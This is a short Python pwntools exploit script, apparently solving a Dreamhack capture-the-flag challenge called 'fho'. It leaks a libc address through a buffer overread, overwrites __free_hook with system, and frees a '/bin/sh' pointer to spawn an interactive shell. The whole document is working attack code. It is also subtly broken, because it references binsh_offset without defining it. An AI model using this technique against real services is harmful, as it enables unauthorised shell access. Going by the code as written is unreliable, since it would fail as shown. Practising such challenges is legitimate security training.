from pwn import*

#context.log_level = 'debug'

#p = remote('host3.dreamhack.games', '19564')
p = remote('127.0.0.1', 7182)
#p = process('./fho')
libc = ELF("./libc-2.27.so")
free_hook_offset = libc.symbols['__free_hook']
libc_start_main_offset = libc.symbols['__libc_start_main']
system_offset = libc.symbols['system']

p.sendafter(b"Buf: ", b"a"*0x48)
p.recvuntil(b"a"*0x48)
libc_start_main = u64(p.recv(6).ljust(8, b"\x00")) - 231
libc_base = libc_start_main - libc_start_main_offset
print(hex(libc_base))

free_hook = libc_base+ free_hook_offset
binsh = libc_base + binsh_offset
system = libc_base + system_offset

p.sendlineafter(b"To write: ", str(free_hook).encode())
p.sendlineafter(b"With: ", str(system).encode())
p.sendlineafter(b"To free: ", str(binsh).encode())

p.interactive()